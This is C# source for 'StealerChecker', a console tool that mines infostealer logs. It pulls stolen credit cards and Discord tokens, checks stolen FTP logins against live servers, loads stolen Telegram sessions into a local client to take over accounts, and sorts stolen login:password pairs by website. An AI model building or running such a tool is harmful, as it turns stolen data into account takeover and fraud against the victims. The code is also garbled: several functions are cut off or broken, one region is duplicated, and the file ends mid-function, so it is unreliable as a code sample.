using CommandLine;
using Everything;
using Everything.Model;
using FluentFTP;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using TemnijExt;
using Console = Colorful.Console;

namespace stealerchecker
{
    internal static class Program
    {
        public class Options
        {
            [Option('p', "path", Required = true, HelpText = "Path to folder with logs")]
            public string Path { get; set; }

            [Option('v', "verbose", Required = false, HelpText = "Passwords view verbose mode")]
            public bool Verbose { get; set; }

            [Option('e', "everything", Required = false, HelpText = "Use Everything service")]
            public bool Everything { get; set; }
        }

        #region FIELDS

        private const string caption = "StealerChecker v7.3 by Temnij";
        private static string path;
        private static readonly List<string> files = new();
        private static readonly List<string> directories = new();
        private static bool Verbose;
        public static bool Everything;

        #endregion

        private static void Main(string[] args)
        {
            SetStatus();
            #region ARGUMENT PARSING

            Parser.Default.ParseArguments<Options>(args)
                   .WithParsed(o => { path = o.Path; Verbose = o.Verbose; Everything = o.Everything; });

            if (string.IsNullOrEmpty(path))
                Environment.Exit(-1);

            #endregion
            #region LOADING

            Console.WriteLine("Please wait, loading...", Color.LightCyan);

            if (!Everything)
            {
                SetStatus("Adding Directories...");
                AddDirectories();
                Console.WriteLine($"Directories added: {directories.Count}", Color.Gray);
                SetStatus("Adding files...");
                AddFiles();
                Console.WriteLine($"Files added: {files.Count}", Color.Gray);
            }
            else
                GetFilesAsync().Wait();

            glob = GetPasswords();

            Console.Clear();
            SetStatus();

            #endregion

            while (true)
                PrintMainMenu();
        }

        #region FILES

        public static void AddDirectories()
        {
            foreach (var directory in Directory.GetDirectories(path, "*", SearchOption.AllDirectories))
                directories.Add(directory);
        }
        public static void AddFiles()
        {
            foreach (var dir in directories)
                foreach (var file in Directory.GetFiles(dir))
                    if (Path.GetFileName(file) == "InfoHERE.txt")
                        files.Add(file);
        }

        #endregion
        #region CCs

        public static void GetCC()
        {
            foreach (var file in files)
            {
                SetStatus($"Working... file {files.IndexOf(file)} of {files.Count}");
                var match = Regex.Match(File.ReadAllText(file), @"∟💳(\d*)");
                var cards = int.Parse(match.Groups[1].Value);

                if (cards != 0)
                {
                    Console.Write($"[{file}]", Color.Green);
                    Console.WriteLine($" - {cards} cards!");

                    Console.WriteLine(WriteCC(file));
                }
            }
            SetStatus();
        }
        public static string WriteCC(string path)
        {
            var returned = "";

            var filecl = FileCl.Load(path);
            var dir = filecl.Info.Directory.FullName;
            var cardsFolder = Path.Combine(dir, "Browsers", "Cards");

            foreach (var file in Directory.GetFiles(cardsFolder))
            {
                var thisFile = FileCl.Load(file);
                if (thisFile.Info.Length > 5)
                    returned += thisFile.GetContent() + Environment.NewLine;
            }

            return returned;
        }

        #endregion
        #region FTPs

        public static void GetFTP()
        {
            foreach (var file in files)
            {
                if (Path.GetFileName(file) == "InfoHERE.txt")
                {
                    SetStatus($"Working... file {files.IndexOf(file)} of {files.Count}");
                    var match = Regex.Match(File.ReadAllText(file), @"📡 FTP\s*∟ FileZilla: (❌|✅).*\s*∟ TotalCmd: (❌|✅).*");

                    var fileZila = match.Groups[1].Value == "✅";
                    var totalCmd = match.Groups[2].Value == "✅";

                    if (fileZila)
                    {
                        Console.Write($"[{file}]", Color.Green);
                        Console.WriteLine(" - FileZila");

                        WriteFileZila(file);
                    }
                    if (totalCmd)
                    {
                        Console.Write($"[{file}]", Color.Green);
                        Console.WriteLine(" - Total Commander");

                        Console.WriteLine(WriteTotalCmd(file));
                    }
                }
                else if (Path.GetFileName(file) == "InfoHERE.html")
                {
                    SetStatus($"Working... file {files.IndexOf(file)} of {files.Count}");
                    var match = Regex.Match(File.ReadAllText(file), "<h2 style=\"color:white\">📡 FTP<\\/h2>\\s*<p style=\"color:white\">   ∟ FileZilla: (❌|✅)<\\/p>\\s*<p style=\"color:white\">   ∟ TotalCmd: (❌|✅)<\\/p>");

                    var fileZila = match.Groups[1].Value == "✅";
                    var totalCmd = match.Groups[2].Value == "✅";

                    if (fileZila)
                    {
                        Console.Write($"[{file}]", Color.Green);
                        Console.WriteLine(" - FileZila");

                        WriteFileZila(file);
                    }
                    if (totalCmd)
                    {
                        Console.Write($"[{file}]", Color.Green);
                        Console.WriteLine(" - Total Commander");

                        Console.WriteLine(WriteTotalCmd(file));
                    }
                }
            }
            SetStatus();
        }
        public static void WriteFileZila(string path)
        {
            var filecl = FileCl.Load(path);
            var dir = filecl.Info.Directory.FullName;
            var fileZilaFolder = Path.Combine(dir, "FileZilla");

            foreach (var file in Directory.GetFiles(fileZilaFolder))
            {
                var thisFile = FileCl.Load(file);
                if (thisFile.Info.Length > 5)
                    CheckFileZilla(thisFile.GetContent());
                Console.WriteLine();
            }
        }
        public static void CheckFileZilla(string fileZillaLog)
        {
            const string pattern = @"Host: (.*)\s*Port: (.*)\s*User: (.*)\s*Pass: (.*)";
            foreach (Match match in Regex.Matches(fileZillaLog, pattern))
            {
                string
                    Host = match.Groups[1].Value.Replace("\r", "").Replace("\\r", ""),
                    Port = match.Groups[2].Value.Replace("\r", "").Replace("\\r", ""),
                    User = match.Groups[3].Value.Replace("\r", "").Replace("\\r", ""),
                    Pass = match.Groups[4].Value.Replace("\r", "").Replace("\\r", "");

                try
                {
                    SetStatus($"Checking {Host}...");
                    FtpClient client = new(Host)
                    {
                        Port = int.Parse(Port),
                        Credentials = new NetworkCredential(User, Pass),
                        ConnectTimeout = 5000,
                        DataConnectionConnectTimeout = 5000,
                        DataConnectionReadTimeout = 5000,
                        ReadTimeout = 5000
                    };

                    client.Connect();
                    client.Disconnect();

                    Console.WriteLine($"{Host}:{Port};{User}:{Pass} - GOOD", Color.LightGreen);
                }
                catch (FtpAuthenticationException)
                {
                    try
                    {
                        SetStatus($"Checking for anonymous auth {Host}...");
                        FtpClient client = new(Host)
                        {
                            Port = int.Parse(Port),
                            Credentials = new NetworkCredential("anonymous", ""),
                            ConnectTimeout = 5000,
                            DataConnectionConnectTimeout = 5000,
                            DataConnectionReadTimeout = 5000,
                            ReadTimeout = 5000
                        };

                        client.Connect();
                        client.Disconnect();

                        Console.WriteLine($"{Host}:{Port};{User}:{Pass} - GOOD (ANON)", Color.LightGreen);
                    }
                    catch
                    {
                        Console.WriteLine($"{Host}:{Port};{User}:{Pass} - BAD", Color.LightPink);
                    }
                }
                catch
                {
                    Console.WriteLine($"{Host}:{Port};{User}:{Pass} - BAD", Color.LightPink);
                }
            }
        }
        public static string WriteTotalCmd(string path)
        {
            var returned = "";

            var filecl = FileCl.Load(path);
            var dir = filecl.Info.Directory.FullName;
            var totalCmdDir = Path.Combine(dir, "FTP", "Total Commander");

            foreach (var file in Directory.GetFiles(totalCmdDir))
            {
                var thisFile = FileCl.Load(file);
                if (thisFile.Info.Length > 5)
                    returned += thisFile.GetContent() + Environment.NewLine;
            }

            return returned;
        }

        #endregion
        #region DISCORD

        public static void GetDiscord()
        {
            List<string> tokens = new();

            foreach (var file in files)
            {
                var info = new FileInfo(file);
                SetStatus($"Working... file {files.IndexOf(file)} of {files.Count}");

                if (info.Name == "InfoHERE.txt"
                    || info.Name == "InfoHERE.html")
                {
                    var match = Regex.Match(File.ReadAllText(file), "💬 Discord: (✅|❌)");

                    var discord = match.Groups[1].Value == "✅";

                    try
                    {
                        if (discord)
                            tokens.AddRange(WriteDiscord(file, false));
                    }
                    catch { }
                }
                else if (info.Name == "UserInformation.txt")
                {
                    try
                    {
                        tokens.AddRange(WriteDiscord(file, true));
                    }
                    catch { }
                }
            }
            SetStatus();

            File.WriteAllLines("DiscordTokens.txt", tokens.Distinct());
        }
        public static List<string> WriteDiscord(string path, bool redline)
        {
            List<string> tokensList = new();

            var filecl = FileCl.Load(path);
            var dir = filecl.Info.Directory.FullName;
            string discordDir;

            if (!redline)
                discordDir = Path.Combine(dir, "Discord", "Local Storage", "leveldb");
            else
                discordDir = Path.Combine(dir, "Discord");


            foreach (var file in Directory.GetFiles(discordDir))
            {
                try
                {
                    var thisFile = FileCl.Load(file);
                    if (thisFile.Info.Length > 5)
                    {
                        var tokens = CheckDiscord(thisFile.GetContent());
                        if (tokens.Count != 0)
                        {
                            Console.WriteLine();
                            var newfile = "";
                            if (File.Exists(file))
                                if (!redline)
                                    newfile = FileCl.Load(file).Info.Directory.Parent.Parent.Parent.FullName;
                                else
                                    newfile = FileCl.Load(file).Info.Directory.Parent.FullName;

                            Console.Write($"[{newfile}]", Color.Green);
                            Console.WriteLine(" - Discord");

                    foreach (var token in tokens)
                        if (!tokensGlobal.Contains(token))
                        {
                            Console.WriteLine($"\t{token}", Color.LightGreen);

                            using var stream = new StreamWriter("DiscordTokens.txt", true);
                            stream.WriteLine(token);
                        }

            return tokensList;
        }
        public static List<string> CheckDiscord(string content)
        {
            var tokens = new List<string>();
            foreach (Match match in Regex.Matches(content, "[^\"]*"))
                if (match.Length == 59 && match.Value.StartsWith("N") && Regex.IsMatch(match.Value, @"[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}"))
                    tokens.Add(match.Value);

            tokens.Distinct();
            return tokens;
        }

        #endregion
        #region SEARCH

        #region URL

        public static void SearchByURL(string query)
        {
            SetStatus("Working... ");

            foreach (var password in SearchByURLHerlper(query))
                if (!Verbose)
                    Console.WriteLine(password, Color.LightGreen);

            SetStatus();
        }
        private static List<string> SearchByURLHerlper(string query)
        {
            var pas = new List<string>();
            var filecl = FileCl.Load(path);
            var dir = filecl.Info.Directory.FullName;
            var passwordsDir = Path.Combine(dir, "Browsers", "Passwords");

            foreach (var file in Directory.GetFiles(passwordsDir))
            {
                var thisFile = FileCl.Load(file);

                if (thisFile.Info.Name == "ChromiumV2.txt")
                {
                    foreach (var pass in Regex.Split(thisFile.GetContent(), "============================="))
                    {
                        var log = Regex.Match(pass, @"Url: (.*)\s*Username: (.*)\s*Password: (.*)\s*Application: (.*)");

                        string
                            Url = log.Groups[1].Value.Replace("\r", "").Replace("\\r", ""),
                            Username = log.Groups[2].Value.Replace("\r", "").Replace("\\r", ""),
                            Password = log.Groups[3].Value.Replace("\r", "").Replace("\\r", "");

                        if (Url.Contains(query))
                        {
                            if (Username?.Length == 0 || Password?.Length == 0)
                                continue;

                            if (Verbose)
                                pas.Add($"{Username}:{Password}\t{Url}");
                            else
                                pas.Add($"{Username}:{Password}");
                        }
                    }
                }
                if (thisFile.Info.Name == "Passwords_Google.txt")
                {
                    foreach (var pass in Regex.Split(thisFile.GetContent(), "----------------------------------------"))
                    {
                        var log = Regex.Match(pass, @"Url: (.*)\s*Login: (.*)\s*Password: (.*)\s*Browser: (.*)");

                        string
                            Url = log.Groups[1].Value.Replace("\r", "").Replace("\\r", ""),
                            Username = log.Groups[2].Value.Replace("\r", "").Replace("\\r", ""),
                            Password = log.Groups[3].Value.Replace("\r", "").Replace("\\r", "");

                        if (Url.Contains(query))
                        {
                            if (Username?.Length == 0 || Password?.Length == 0)
                                continue;

                            if (Verbose)
                                pas.Add($"{Username}:{Password}\t{Url}");
                            else
                                pas.Add($"{Username}:{Password}");
                        }
                    }
                }
                if (thisFile.Info.Name == "Passwords_Mozilla.txt")
                {
                    foreach (var pass in Regex.Split(thisFile.GetContent().Replace("\r", ""), "\n\n"))
                    {
                        var log = Regex.Match(pass, @"URL : (.*)\s*Login: (.*)\s*Password: (.*)");

                        string
                            Url = log.Groups[1].Value.Replace("\r", "").Replace("\\r", ""),
                            Username = log.Groups[2].Value.Replace("\r", "").Replace("\\r", ""),
                            Password = log.Groups[3].Value.Replace("\r", "").Replace("\\r", "");

                        if (Url.Contains(query))
                        {
                            if (Username?.Length == 0 || Password?.Length == 0)
                                continue;

                            if (Verbose)
                                pas.Add($"{Username}:{Password}\t{Url}");
                            else
                                pas.Add($"{Username}:{Password}");
                        }
                    }
                }
                if (thisFile.Info.Name == "Passwords_Opera.txt")
                {
                    foreach (var pass in Regex.Split(thisFile.GetContent(), "----------------------------------------"))
                    {
                        var log = Regex.Match(pass, @"Url: (.*)\s*Login: (.*)\s*Passwords: (.*)");

                        string
                            Url = log.Groups[1].Value.Replace("\r", "").Replace("\\r", ""),
                            Username = log.Groups[2].Value.Replace("\r", "").Replace("\\r", ""),
                            Password = log.Groups[3].Value.Replace("\r", "").Replace("\\r", "");

                        if (Url.Contains(query))
                        {
                            if (Username?.Length == 0 || Password?.Length == 0)
                                continue;

                            if (Verbose)
                                pas.Add($"{Username}:{Password}\t{Url}");
                            else
                                pas.Add($"{Username}:{Password}");
                        }
                    }
                }
                if (thisFile.Info.Name == "Passwords_Unknown.txt")
                {
                    foreach (var pass in Regex.Split(thisFile.GetContent(), "----------------------------------------"))
                    {
                        var log = Regex.Match(pass, @"Url: (.*)\s*Login: (.*)\s*Password: (.*)");

                        string
                            Url = log.Groups[1].Value.Replace("\r", "").Replace("\\r", ""),
                            Username = log.Groups[2].Value.Replace("\r", "").Replace("\\r", ""),
                            Password = log.Groups[3].Value.Replace("\r", "").Replace("\\r", "");

                        if (Url.Contains(query))
                        {
                            if (Username?.Length == 0 || Password?.Length == 0)
                                continue;

                            if (Verbose)
                                pas.Add($"{Username}:{Password}\t{Url}");
                            else
                                pas.Add($"{Username}:{Password}");
                        }
                    }
                }
            }

            return pas;
        }

        #endregion

        #endregion
        #region TELEGRAM

        public static int counter = 0;

        public static void GetTelegram()
        {
            if (!Directory.Exists("Telegram"))
            {
                foreach (var file in files)
                {
                    var match = Regex.Match(File.ReadAllText(file), "✈️ Telegram: (❌|✅)");

                    if (match.Groups[1].Value == "✅")
                        CopyTelegram(file);
                }
            }
            SetStatus();

        again:
            var dirs = new List<string>();
            foreach (var dir in Directory.GetDirectories("Telegram"))
                dirs.Add(new DirectoryInfo(dir).Name);

            var ordered = dirs
            .OrderBy(x => int.Parse(x))
            .ToList();

            foreach (var dir in ordered)
                Console.WriteLine(dir, Color.LightGreen);

            Console.WriteLine("Select Telegram:", Color.Green);
            var select = int.Parse(Console.ReadLine());

            try { Directory.Delete("tdata"); } catch { }

            SetStatus("Copying Telegram session");
            CopyFilesRecursively(Path.Combine("Telegram", select.ToString()), "tdata");
            SetStatus();

            Process.Start("Telegram.exe");

            Console.ReadLine();

            foreach (var process in Process.GetProcessesByName("Telegram"))
                process.Kill();

            goto again;
        }
        public static void CopyTelegram(string path)
        {
            var filecl = FileCl.Load(path);
            var dir = filecl.Info.Directory.FullName;
            var tgDir = "";

            foreach (var tempDir in Directory.GetDirectories(dir))
                if (new DirectoryInfo(tempDir).Name.StartsWith("Telegram"))
                    tgDir = tempDir;

            CopyFilesRecursively(tgDir, Path.Combine(Directory.GetCurrentDirectory(), "Telegram", counter.ToString()));
            counter++;
            SetStatus($"{counter} telegram dirs copied");
        }

        private static void CopyFilesRecursively(string sourcePath, string targetPath)
        {
            foreach (string dirPath in Directory.GetDirectories(sourcePath, "*", SearchOption.AllDirectories))
                Directory.CreateDirectory(dirPath.Replace(sourcePath, targetPath));

            foreach (string newPath in Directory.GetFiles(sourcePath, "*.*", SearchOption.AllDirectories))
                File.Copy(newPath, newPath.Replace(sourcePath, targetPath), true);
        }

        #endregion
        #region SORT LOGS

        public static void SortLogs()
        {
            List<KeyValuePair<string, DateTime>> result = new();
            Console.WriteLine("Loading...", Color.DarkCyan);

            foreach (var file in files)
            {
                var filecl = FileCl.Load(file);
                var dir = filecl.Info.Directory.FullName;
                var sysFile = Path.Combine(dir, "System_Information.txt");
                var matchRus = Regex.Match(File.ReadAllText(sysFile), @"Current time Utc: ((\d*)\.(\d*)\.(\d*) (\d*):(\d*):(\d*))");
                var matchEur = Regex.Match(File.ReadAllText(sysFile), @"Current time Utc: ((\d*)\/(\d*)\/(\d*) (\d*):(\d*):(\d*) (AM|PM))");
                DateTime date = DateTime.Now;

                if (matchRus.Success)
                {
                    try
                    {
                        date = DateTime.Parse(matchRus.Groups[1].Value);
                        result.Add(new KeyValuePair<string, DateTime>(dir, date));
                    }
                    catch
                    {
                        throw;
                    }
                }

                if (matchEur.Success)
                {
                    try
                    {
                        date = DateTime.ParseExact(matchEur.Groups[1].Value, "M/d/yyyy h:mm:ss tt", CultureInfo.InvariantCulture);
                        result.Add(new KeyValuePair<string, DateTime>(dir, date));
                    }
                    catch
                    {
                        throw;
                    }
                }
            }

            Console.WriteLine("Loaded!", Color.LightGreen);
            Console.WriteLine();
            Console.WriteLine("Sorting by Year/Month...", Color.DarkCyan);

            if (!Directory.Exists("Sorts"))
                Directory.CreateDirectory("Sorts");
            else
            {
                Console.WriteLine("Directory exists, deleting...", Color.Pink);
                deleteFolder("Sorts");
                Console.WriteLine("Deleted!", Color.LightGreen);
                Directory.CreateDirectory("Sorts");
            }

            foreach (var pair in result)
            {
                var date = pair.Value;
                var directory = pair.Key;
                var year = date.Year.ToString();
                var month = date.Month.ToString();

                if (!Directory.Exists(Path.Combine("Sorts", year)))
                    Directory.CreateDirectory(Path.Combine("Sorts", year));
                if (!Directory.Exists(Path.Combine("Sorts", year, month)))
                    Directory.CreateDirectory(Path.Combine("Sorts", year, month));

                CopyFilesRecursively(directory, Path.Combine("Sorts", year, month, new DirectoryInfo(directory).Name));
                SetStatus($"Copying... Directory {result.IndexOf(pair)}/{result.Count}");
            }
            SetStatus();

            Console.WriteLine("Sorted!", Color.Green);
        }
        private static void deleteFolder(string folder)
        {
            try
            {
                DirectoryInfo di = new(folder);
                DirectoryInfo[] diA = di.GetDirectories();
                foreach (FileInfo f in di.GetFiles())
                    f.Delete();

                foreach (DirectoryInfo df in diA)
                {
                    deleteFolder(df.FullName);
                    if (df.GetDirectories().Length == 0 && df.GetFiles().Length == 0) df.Delete();
                }
            }
            catch (DirectoryNotFoundException ex)
            {
                Console.WriteLine("Директория не найдена. Ошибка: " + ex.Message);
            }
            catch (UnauthorizedAccessException ex)
            {
                Console.WriteLine("Отсутствует доступ. Ошибка: " + ex.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Произошла ошибка. Обратитесь к разрабу. Ошибка: " + ex.Message);
            }
        }

        #endregion
        #region STATUS FUNCTIONS

        public static void SetStatus(string status)
        {
            Console.Title = caption + " | " + status;
        }

        public static void SetStatus()
        {
            Console.Title = caption;
        }

        #endregion
        #region SORT BY CATEGORIES

        static int counter2 = 0;
        static int count2 = 0;
        static List<Password> glob;

        public static void SortLogsbyCategories()
        {
            SetStatus("Loading...");

            foreach (var file in Directory.GetFiles("services"))
                ProcessFile(file);

            SetStatus();
        }

        public static List<Password> GetPasswords()
        {
            List<Password> passwords = new();

            foreach (var filePas in files)
            {
                var pas = new List<Password>();
                var filecl = FileCl.Load(filePas);
                var dir = filecl.Info.Directory.FullName;
                var passwordsDir = Path.Combine(dir, "Browsers", "Passwords");

                foreach (var file in Directory.GetFiles(passwordsDir))
                {
                    var thisFile = FileCl.Load(file);

                    if (thisFile.Info.Name == "ChromiumV2.txt")
                    {
                        foreach (var pass in Regex.Split(thisFile.GetContent(), "============================="))
                        {
                            var log = Regex.Match(pass, @"Url: (.*)\s*Username: (.*)\s*Password: (.*)\s*Application: (.*)");

                            string
                                Url = log.Groups[1].Value.Replace("\r", "").Replace("\\r", ""),
                                Username = log.Groups[2].Value.Replace("\r", "").Replace("\\r", ""),
                                Password = log.Groups[3].Value.Replace("\r", "").Replace("\\r", "");

                            if (Username?.Length > 1 || Password?.Length > 1)
                                pas.Add(new Password(Url, Username, Password));
                        }
                    }
                    if (thisFile.Info.Name == "Passwords_Google.txt")
                    {
                        foreach (var pass in Regex.Split(thisFile.GetContent(), "----------------------------------------"))
                        {
                            var log = Regex.Match(pass, @"Url: (.*)\s*Login: (.*)\s*Password: (.*)\s*Browser: (.*)");

                            string
                                Url = log.Groups[1].Value.Replace("\r", "").Replace("\\r", ""),
                                Username = log.Groups[2].Value.Replace("\r", "").Replace("\\r", ""),
                                Password = log.Groups[3].Value.Replace("\r", "").Replace("\\r", "");

                            if (Username?.Length > 1 || Password?.Length > 1)
                                pas.Add(new Password(Url, Username, Password));
                        }
                    }
                    if (thisFile.Info.Name == "Passwords_Mozilla.txt")
                    {
                        foreach (var pass in Regex.Split(thisFile.GetContent().Replace("\r", ""), "\n\n"))
                        {
                            var log = Regex.Match(pass, @"URL : (.*)\s*Login: (.*)\s*Password: (.*)");

                            string
                                Url = log.Groups[1].Value.Replace("\r", "").Replace("\\r", ""),
                                Username = log.Groups[2].Value.Replace("\r", "").Replace("\\r", ""),
                                Password = log.Groups[3].Value.Replace("\r", "").Replace("\\r", "");

                            if (Username?.Length > 1 || Password?.Length > 1)
                                pas.Add(new Password(Url, Username, Password));
                        }
                    }
                    if (thisFile.Info.Name == "Passwords_Opera.txt")
                    {
                        foreach (var pass in Regex.Split(thisFile.GetContent(), "----------------------------------------"))
                        {
                            var log = Regex.Match(pass, @"Url: (.*)\s*Login: (.*)\s*Passwords: (.*)");

                            string
                                Url = log.Groups[1].Value.Replace("\r", "").Replace("\\r", ""),
                                Username = log.Groups[2].Value.Replace("\r", "").Replace("\\r", ""),
                                Password = log.Groups[3].Value.Replace("\r", "").Replace("\\r", "");

                            if (Username?.Length > 1 || Password?.Length > 1)
                                pas.Add(new Password(Url, Username, Password));
                        }
                    }
                    if (thisFile.Info.Name == "Passwords_Unknown.txt")
                    {
                        foreach (var pass in Regex.Split(thisFile.GetContent(), "----------------------------------------"))
                        {
                            var log = Regex.Match(pass, @"Url: (.*)\s*Login: (.*)\s*Password: (.*)");

                            string
                                Url = log.Groups[1].Value.Replace("\r", "").Replace("\\r", ""),
                                Username = log.Groups[2].Value.Replace("\r", "").Replace("\\r", ""),
                                Password = log.Groups[3].Value.Replace("\r", "").Replace("\\r", "");

                            if (Username?.Length > 1 || Password?.Length > 1)
                                pas.Add(new Password(Url, Username, Password));
                        }
                    }
                }

                    passwords.AddRange(pas);
                }
                catch { }
            }

            return passwords.Distinct().ToList();
        }
        public static void ProcessFile(string path)
        {
            var categoryName = Path.Combine("Categories", Path.GetFileNameWithoutExtension(path));
            var services = File.ReadAllLines(path);

            if (!Directory.Exists(categoryName))
                Directory.CreateDirectory(categoryName);

            count2 = glob.Count;
            foreach (var pass in glob)
            {
                counter2++;
                SetStatus($"Working... {counter2}/{count2}");

                string serviceName = "";
                if (services.Any(x => pass.Url.IndexOf(x, StringComparison.OrdinalIgnoreCase) >= 0))
                    serviceName = services.First(x => pass.Url.IndexOf(x, StringComparison.OrdinalIgnoreCase) >= 0);
                else
                    continue;
                var filename = Path.Combine(categoryName, serviceName) + ".txt";

                var login = pass.Login;
                if(serviceName == "vk.com")
                    login = login.Replace("(", "")
                        .Replace(")", "")
                        .Replace(" ", "")
                        .Replace("-", "")
                        .Replace("+", "");

                File.AppendAllText(filename, $"{login}:{pass.Pass}");
                File.WriteAllLines(filename, File.ReadAllLines(filename).Distinct());

            }
            counter2 = 0;
        }
        public class Password
        {
            public string Url;
            public string Login;
            public string Pass;

            public Password(string url, string login, string pass)
            {
                Url = url;
                Login = login;
                Pass = pass;
            }
        }

        #endregion
        #region EVERYTHING

        public static async Task GetFilesAsync()
        {
            var patterns = new List<string>()
            {
                "InfoHERE.txt",
                "InfoHERE.html",
                "UserInformation.txt"
            };
            files.AddRange(await GetPathsAsync(patterns).ConfigureAwait(false));
        }
        public static async Task<List<string>> GetPathsAsync(List<string> patterns)
        {
            var pathsResult = new List<string>();
            var client = new EverythingClient();

            foreach (var pattern in patterns)
                pathsResult.AddRange((await client.SearchAsync(pattern).ConfigureAwait(false)).Items
                                .OfType<FileResultItem>()
                                .Where(file => file.FullPath.StartsWith(path.Replace("/", "\\"), StringComparison.OrdinalIgnoreCase))
                                .Select(x => x.FullPath));
            return pathsResult;
        }

        #endregion
        #region MENU

        public static void PrintSearchMenu()
        {
            Console.Clear();
            Console.WriteLine("Searhing", Color.Pink);
            Console.WriteLine();
            Console.WriteLine("1. Search by URL", Color.LightCyan);
            Console.WriteLine("2. Search by Password", Color.LightCyan);
            Console.WriteLine("3. Search by Username", Color.LightCyan);
            Console.WriteLine();
            Console.WriteLine("55. back <--", Color.Cyan);

            var selection = 0;
            try
            {
                selection = int.Parse(Console.ReadLine());
            }
            catch
            {
                Console.Clear();
                PrintSearchMenu();
            }

            Console.WriteLine();
            switch (selection)
            {
                case 1:
                    Console.WriteLine("Enter query:", Color.LightSkyBlue);
                    SearchByURL(Console.ReadLine());
                    break;
                case 2:
                    Console.WriteLine("Enter query:", Color.LightSkyBlue);
                    SearchByPass(Console.ReadLine());
                    break;
                case 3:
                    Console.WriteLine("Enter query:", Color.LightSkyBlue);
                    SearchByUsername(Console.ReadLine());
                    break;

                case 55:
                    Console.Clear();
                    PrintMainMenu();
                    break;
                default: PrintSearchMenu(); break;
            }
        }
        public static void PrintSortMenu()
        {
            Console.Clear();
            Console.WriteLine("Sorting", Color.Pink);
            Console.WriteLine();
            Console.WriteLine("1. Sort by date", Color.LightCyan);
            Console.WriteLine("2. Sort login:pass by categories", Color.LightCyan);
            Console.WriteLine();
            Console.WriteLine("55. back <--", Color.Cyan);

            var selection = 0;
            try
            {
                selection = int.Parse(Console.ReadLine());
            }
            catch
            {
                Console.Clear();
                PrintSortMenu();
            }

            Console.WriteLine();
            switch (selection)
            {
                case 1: SortLogs(); break;
                case 2: SortLogsbyCategories(); break;

                case 55:
                    Console.Clear();
                    PrintMainMenu();
                    break;
                default: PrintSortMenu(); break;
            }
        }
        public static void PrintGetMenu()
        {
            Console.Clear();
            Console.WriteLine("Getting", Color.Pink);
            Console.WriteLine();
            Console.WriteLine("1. Get CC cards", Color.LightCyan);
            Console.WriteLine("2. Get&Check FTP servers", Color.LightCyan);
            Console.WriteLine("3. Get Discord tokens", Color.LightCyan);
            Console.WriteLine("4. Get Telegrams", Color.LightCyan);
            Console.WriteLine();
            Console.WriteLine("55. back <--", Color.Cyan);

            var selection = 0;
            try
            {
                selection = int.Parse(Console.ReadLine());
            }
            catch
            {
                Console.Clear();
                PrintGetMenu();
            }

            Console.WriteLine();
            switch (selection)
            {
                case 1: GetCC(); break;
                case 2: GetFTP(); break;
                case 3: GetDiscord(); break;
                case 4: GetTelegram(); break;

                case 55:
                    Console.Clear();
                    PrintMainMenu();
                    break;
                default: PrintGetMenu(); break;
            }
        }
        public static void PrintAnalysisMenu()
        {
            Console.Clear();
            Console.WriteLine("Analysis", Color.Pink);
            Console.WriteLine();
            Console.Write("1. Username in the password - ", Color.LightCyan);
            Console.WriteLine($"~{AnalyzeLoginInPass()}%", Color.DarkCyan);
            Console.Write("2. Username = password - ", Color.LightCyan);
            Console.WriteLine($"~{AnalyzeLoginEqualsPass()}%", Color.DarkCyan);
            //Console.WriteLine("3. Most popular URLs:", Color.LightCyan);
            //Console.WriteLine(AnalyzeMostPopularURLs(), Color.DarkCyan);
            Console.WriteLine();
            Console.WriteLine("55. back <--", Color.Cyan);

            var selection = 0;
            try
            {
                selection = int.Parse(Console.ReadLine());
            }
            catch
            {
                Console.Clear();
                PrintAnalysisMenu();
            }

            Console.WriteLine();
            switch (selection)
            {
                case 55:
                    Console.Clear();
                    PrintMainMenu();
                    break;
                default: PrintAnalysisMenu(); break;
            }
        }
        public static void PrintMainMenu()
        {
            Console.WriteLine();
            Console.WriteAscii("StealerChecker", Color.Pink);
            Console.WriteLine(caption, Color.Pink);
            Console.WriteLine($"Loaded: {files.Count} logs", Color.Gray);
            Console.WriteLine();
            Console.WriteLine("1. Get", Color.LightCyan);
            Console.WriteLine("2. Search", Color.LightCyan);
            Console.WriteLine("3. Sort Logs", Color.LightCyan);
            Console.WriteLine("4. Analysis", Color.LightCyan);
            Console.WriteLine();
            Console.WriteLine($"88. Verbose: {Verbose}", Color.Cyan);
            Console.WriteLine("99. Exit", Color.LightPink);

            var selection = 0;
            try
            {
                selection = int.Parse(Console.ReadLine());
            }
            catch
            {
                Console.Clear();
                PrintMainMenu();
            }

            switch (selection)
            {
                case 1: PrintGetMenu(); break;
                case 2: PrintSearchMenu(); break;
                case 3: PrintSortMenu(); break;
                case 4: PrintAnalysisMenu(); break;

                case 88:
                    Verbose = !Verbose;
                    Console.Clear();
                    break;
                case 99: Environment.Exit(0); break;
            }
        }

        #endregion
        #region ANALYSIS

        public static string AnalyzeMostPopularURLs()
        {
            var top3 = new StringBuilder();
            var percentages = new List<KeyValuePair<decimal, string>>();

            glob.ForEach(x =>
                percentages.Add(new KeyValuePair<decimal, string>(AnalyzePercentOfURL(x.Url), x.Url)));

            percentages.Sort();

            for (int i = 0; i < 3; i++)
                top3.WriteLine($"{i + 1}. {percentages[i].Value} - {percentages[i].Key}");

            return top3.ToString();
        }
        public static decimal AnalyzeLoginInPass()
        {
            SetStatus("Analyzing...");
            var count = glob
                .Count(x => x.Pass.IndexOf(x.Login, StringComparison.OrdinalIgnoreCase) >= 0);
            SetStatus();

            return Math.Round(GetPercent(glob.Count, count), 2);
        }
        public static decimal AnalyzePercentOfURL(string url)
        {
            SetStatus("Analyzing...");
            var count = glob
                .Count(x => x.Url.IndexOf(url, StringComparison.OrdinalIgnoreCase) >= 0);
            SetStatus();

            return Math.Round(GetPercent(glob.Count, count), 2);
        }
        public static decimal AnalyzeLoginEqualsPass()
        {
            SetStatus("Analyzing...");
            var count = glob
                .Count(x => x.Pass.Equals(x.Login, StringComparison.OrdinalIgnoreCase));
            SetStatus();

            return Math.Round(GetPercent(glob.Count, count), 2);
        }
        public static decimal GetPercent(int b, int a)
        {
            if (b == 0) return 0;

            return a / (b / 100M);
        }

        #endregion
        #region EVERYTHING

        public static async Task GetFilesAsync()
        {
            var client = new EverythingClient();
            var result = await client.SearchAsync("InfoHERE.txt").ConfigureAwait(false);
            foreach (var file in result.Items.OfType<FileResultItem>())
                if (file.FullPath.StartsWith(path.Replace("/", "\\"), StringComparison.OrdinalIgnoreCase))
                    files.Add(file.FullPath);

